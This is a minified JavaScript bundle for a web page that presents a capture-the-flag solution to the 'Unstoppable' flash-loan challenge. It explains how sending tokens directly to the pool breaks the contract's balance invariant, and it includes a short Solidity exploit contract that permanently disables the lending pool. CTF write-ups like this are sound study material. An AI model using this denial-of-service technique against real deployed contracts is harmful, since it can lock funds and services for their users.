/*! For license information please see 489.369bf3d2.chunk.js.LICENSE.txt */
"use strict";(self.webpackChunkclient=self.webpackChunkclient||[]).push([[489],{73:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("Zap",[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]])},2105:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("Code",[["polyline",{points:"16 18 22 12 16 6",key:"z7tu5w"}],["polyline",{points:"8 6 2 12 8 18",key:"1eg1df"}]])},2382:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]])},3165:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]])},4063:(e,s,n)=>{n.d(s,{A:()=>d});var a=n(8139),l=n.n(a),t=n(5043),c=n(7852),i=n(579);const r=t.forwardRef(((e,s)=>{let{bsPrefix:n,bg:a="primary",pill:t=!1,text:r,className:d,as:o="span",...h}=e;const x=(0,c.oU)(n,"badge");return(0,i.jsx)(o,{ref:s,...h,className:l()(d,x,t&&"rounded-pill",r&&`text-${r}`,a&&`bg-${a}`)})}));r.displayName="Badge";const d=r},5727:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]])},8729:(e,s,n)=>{n.d(s,{A:()=>a});const a=(0,n(7784).A)("BookText",[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}],["path",{d:"M8 11h8",key:"vwpz6n"}],["path",{d:"M8 7h6",key:"1f0q6e"}]])},9489:(e,s,n)=>{n.r(s),n.d(s,{default:()=>m});n(5043);var a=n(457),l=n(8628),t=n(4063),c=n(5727),i=n(7719),r=n(2382),d=n(3165),o=n(8729),h=n(73),x=n(2105),p=n(579);const m=()=>(0,p.jsxs)("div",{className:"mb-4",children:[(0,p.jsxs)("h3",{className:"d-flex align-items-center gap-2 mb-3",children:[(0,p.jsx)(c.A,{size:20,className:"text-muted"}),"Damn Unstoppable CTF Challenge"]}),(0,p.jsx)(a.A,{defaultActiveKey:"0",children:(0,p.jsxs)(l.A,{children:[(0,p.jsxs)(a.A.Header,{as:l.A.Header,className:"d-flex justify-content-between align-items-center",children:[(0,p.jsxs)("div",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(i.A,{size:18,className:"text-warning"}),(0,p.jsx)("strong",{children:"View Challenge Solution"})]}),(0,p.jsx)(r.A,{size:18})]}),(0,p.jsx)(a.A.Body,{children:(0,p.jsxs)(l.A.Body,{children:[(0,p.jsxs)("div",{className:"mb-4",children:[(0,p.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(d.A,{size:18}),"Challenge Goal"]}),(0,p.jsx)("p",{children:"Stop the UnstoppableLender contract from offering flash loans."})]}),(0,p.jsxs)("div",{className:"mb-4",children:[(0,p.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(o.A,{size:18}),"Initial Setup"]}),(0,p.jsxs)("p",{children:["You start with ",(0,p.jsx)(t.A,{bg:"secondary",children:"100 DVT tokens"})," in your wallet."]}),(0,p.jsx)("p",{children:"The vulnerable contract has two key functions:"}),(0,p.jsx)("pre",{className:"bg-light p-3 rounded",children:"function flashLoan(...) external {\n  uint256 balanceBefore = token.balanceOf(address(this));\n  assert(poolBalance == balanceBefore); // Critical check\n  ...\n}\n\nfunction depositTokens(uint256 amount) external {\n  require(amount > 0);\n  token.transferFrom(msg.sender, address(this), amount);\n  poolBalance += amount; // Internal accounting\n}"})]}),(0,p.jsxs)("div",{className:"mb-4",children:[(0,p.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(i.A,{size:18,className:"text-danger"}),"Core Vulnerability"]}),(0,p.jsx)("p",{children:"The contract maintains two different balance representations:"}),(0,p.jsxs)("ul",{children:[(0,p.jsxs)("li",{children:[(0,p.jsx)("code",{children:"poolBalance"})," - Only updated via ",(0,p.jsx)("code",{children:"depositTokens()"})]}),(0,p.jsxs)("li",{children:[(0,p.jsx)("code",{children:"token.balanceOf()"})," - Reflects actual token balance"]})]}),(0,p.jsx)("p",{children:"Direct token transfers to the contract will break the invariant check:"}),(0,p.jsx)("pre",{className:"bg-light p-2 rounded",children:"assert(poolBalance == balanceBefore);"})]}),(0,p.jsxs)("div",{className:"mb-4",children:[(0,p.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(h.A,{size:18,className:"text-primary"}),"Exploit Steps"]}),(0,p.jsxs)("ol",{children:[(0,p.jsx)("li",{children:"Transfer 1 DVT token directly to the pool contract"}),(0,p.jsxs)("li",{children:["This makes ",(0,p.jsx)("code",{children:"token.balanceOf()"})," exceed ",(0,p.jsx)("code",{children:"poolBalance"})]}),(0,p.jsxs)("li",{children:["The ",(0,p.jsx)("code",{children:"assert()"})," in ",(0,p.jsx)("code",{children:"flashLoan()"})," will now always fail"]})]}),(0,p.jsx)("p",{children:"Result: The flash loan functionality is permanently disabled."})]}),(0,p.jsxs)("div",{children:[(0,p.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,p.jsx)(x.A,{size:18}),"Exploit Contract"]}),(0,p.jsx)("pre",{className:"bg-light p-3 rounded",children:"contract UnstoppableExploit {\n  IERC20 public immutable dvt;\n\n  constructor(IERC20 _dvt) {\n    dvt = _dvt;\n  }\n\n  function attack(address poolAddress, uint256 amount) external {\n    dvt.transferFrom(msg.sender, address(this), amount);\n    dvt.transfer(poolAddress, amount); // Break invariant\n  }\n}"}),(0,p.jsxs)("p",{children:["Usage: ",(0,p.jsx)("code",{children:"exploit.attack(address(unstoppableLender), 1 ether);"})]})]})]})})]})})]})}}]);
//# sourceMappingURL=489.369bf3d2.chunk.js.map